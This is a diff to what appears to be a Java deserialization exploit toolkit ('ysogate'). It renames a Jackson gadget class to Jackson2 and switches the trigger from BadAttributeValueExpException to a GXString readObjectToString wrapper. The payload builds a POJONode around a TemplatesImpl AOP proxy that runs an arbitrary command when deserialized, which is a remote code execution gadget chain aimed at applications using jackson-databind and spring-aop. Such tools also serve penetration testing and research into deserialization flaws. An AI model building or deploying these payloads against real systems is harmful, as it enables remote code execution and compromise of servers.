@@ -3,6 +3,7 @@ package com.h2tg.ysogate.payloads.gadgets;
 import com.fasterxml.jackson.databind.node.POJONode;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.gadgets.jdk.GXString;
 import com.h2tg.ysogate.utils.Gadgets;
 import com.h2tg.ysogate.utils.PayloadRunner;
 import com.h2tg.ysogate.utils.Reflections;
@@ -19,10 +20,10 @@ import java.lang.reflect.Proxy;
 
 @SuppressWarnings({"rawtypes"})
 @Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.14.2", "org.springframework:spring-aop:4.1.4.RELEASE"})
-public class Jackson implements ObjectPayload<Object>
+public class Jackson2 implements ObjectPayload<Object>
 {
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(Jackson.class, args);
+        PayloadRunner.run(Jackson2.class, args);
     }
 
     public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
@@ -43,8 +44,7 @@ public class Jackson implements ObjectPayload<Object>
         ctClass.removeMethod(writeReplace);
         ctClass.toClass();
         POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
-        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
-        Reflections.setFieldValue(val, "val", node);
-        return val;
+        GXString gxString = new GXString();
+        return gxString.readObjectToString(node);
     }
 }
